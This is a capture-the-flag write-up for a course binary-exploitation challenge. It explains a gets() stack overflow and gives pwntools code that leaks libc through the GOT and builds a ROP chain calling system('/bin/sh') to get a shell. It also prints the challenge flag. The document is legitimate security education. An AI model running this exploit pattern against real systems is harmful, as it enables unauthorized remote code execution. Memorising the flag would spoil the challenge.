## Improper Code

[improper](https://github.com/Rookie441/CTF/blob/main/Categories/Binary%20Exploitation/Hard/improper-code/improper)  
[improper.c](https://github.com/Rookie441/CTF/blob/main/Categories/Binary%20Exploitation/Hard/improper-code/improper.c)  

> This challenge was solved by referring to a similar challenge described in this [YouTube Video](https://www.youtube.com/watch?v=i5-cWI_HV8o). The exploit script is also adapted from the video. The following is my attempt to summarize the key takeaways from the video in the context of this challenge.

> We first run the `checksec` command to check the security bits of our binary

![image](https://github.com/Rookie441/CTF/blob/main/Categories/Binary%20Exploitation/Hard/improper-code/checksec.png)

> We can note that `NX` bit is enabled, which denotes not executable. Hence we cannot execute off the stack using shellcode.

> Additionally, Position Independent Executable (`PIE`) is disabled. This will prove useful later on when we talk about the [Global Offset Table](https://en.wikipedia.org/wiki/Global_Offset_Table).

```C
int main() {
  ...
  ...

  char text[64];
  gets(text);

  ...
}
```

> From the code, we can see an obvious buffer overflow vulnerability due to the usage of unsafe `gets()`. However, there are no other functions we can return to, and also we cannot run arbitrary shellcode. Here comes the concept of [Return Oriented Programming](https://en.wikipedia.org/wiki/Return-oriented_programming).

> Return Oriented Programming (ROP) is a computer security exploit technique that allows an attacker to execute code in the presence of security defenses such as executable space protection and code signing.

> In this technique, an attacker gains control of the call stack to hijack program control flow and then executes carefully chosen machine instruction sequences that are already present in the machine's memory, called "gadgets". We can find the ROP gadgets in a binary file using the `ROPgadget` command.

![image](https://github.com/Rookie441/CTF/blob/main/Categories/Binary%20Exploitation/Hard/improper-code/ropgadget.png)

> Each gadget typically ends in a return instruction (ret) and is located in a subroutine within the existing program and/or shared library code. Chained together, these gadgets allow an attacker to perform arbitrary operations on a machine employing defenses that thwart simpler attacks.

> The following shows the number of bytes of all declared variables in the main function

```C
int main() {
  ...
  char a[10] = "hostn";
  char b[70] = "You want this power right?";
  char text[64];
  ...
}
```

> The memory stack layout looks something like this. The stack grows upwards whereas our input to text will be overflowed from top to bottom.

```
text 64
b    70
a    10
RBP  8
RA   8
```

> Thus, to overwrite the return address (RA) and get a segmentation fault, the offset calculated is 64+70+10+8 = `152`.

> We don't know where libc is, so we need to do a memory leak. We have access to `puts()` which prints out something for us to see. Thus, we can call `elf.symbols["puts"]` to give us the address of functions like `gets()` or even `puts()`. What we are doing here is leaking libc address from the [Global Offset Table](https://en.wikipedia.org/wiki/Global_Offset_Table). The Global Offset Table (GOT) is easy to leak with a call to `puts()`; this is only possible because PIE is disabled.

> The pwntools library have this handy ROP function where we can pass in our binary to get a ROP object that we can work with, which we can subsequently use methods such as `rop.call()`

> Now, we can log the address of puts, and lookup where it might be in libc, which we can find in the [libc database](libc.blukat.me)

```python
from pwn import *

context.arch = "amd64"
offset = 152

elf = ELF("./improper")
p = remote('cs2107-ctfd-i.comp.nus.edu.sg', 4009)

rop = ROP(elf)
rop.call(elf.symbols["puts"], [elf.got["puts"]])
rop.call(elf.symbols["main"])

for i in range(7):
    print(p.recvuntil(b"\n"))

payload = [
        b"A"*offset,
        rop.chain()
]

payload = b"".join(payload)
p.sendline(payload)

puts = u64(p.recvuntil(b"\n").rstrip().ljust(8, b"\x00"))
log.info(f"puts found at {hex(puts)}")
```

```
puts found at 0x7f59440915a0
```

> Now that we have the value `0x7f59440915a0`, we can enter it in the libc database, and download the correct version. The binary is 64-bit and the most common architecture is amd64 so we will choose `libc6_2.31-0ubuntu9_amd64.so`

![image](https://github.com/Rookie441/CTF/blob/main/Categories/Binary%20Exploitation/Hard/improper-code/libcdatabase.png)

> Now that we have found libc, we first need to put the base address for the runtime of the program in the same context of our current rendition of libc. We need to tell libc to map the base address to what is currently being used and ran with that program. So, because we found the puts address from the currently running binary, we can determine the libc address using `libc.address = puts - libc.symbols["puts"]`

> We will then build another rop chain with `system` and `/bin/sh` to spawn a shell

```python
...
...

libc = ELF("libc6_2.31-0ubuntu9_amd64.so")
libc.address = puts - libc.symbols["puts"]
log.info(f"libc base address determined {hex(libc.address)}")

rop = ROP(libc)
rop.call("puts", [ next(libc.search(b"/bin/sh\x00")) ])
rop.call("system", [ next(libc.search(b"/bin/sh\x00")) ])
rop.call("exit")

payload = [
        b"A"*offset,
        rop.chain()
]

payload = b"".join(payload)
p.sendline(payload)
p.interactive()
```

> The full exploit script can be found at [exploit.py](https://github.com/Rookie441/CTF/blob/main/Categories/Binary%20Exploitation/Hard/improper-code/exploit.py)

![image](https://github.com/Rookie441/CTF/blob/main/Categories/Binary%20Exploitation/Hard/improper-code/Solved.png)

`CS2107{pR0P3rLy_dr0P_7H4t_1mPRoP3rnE5s}`
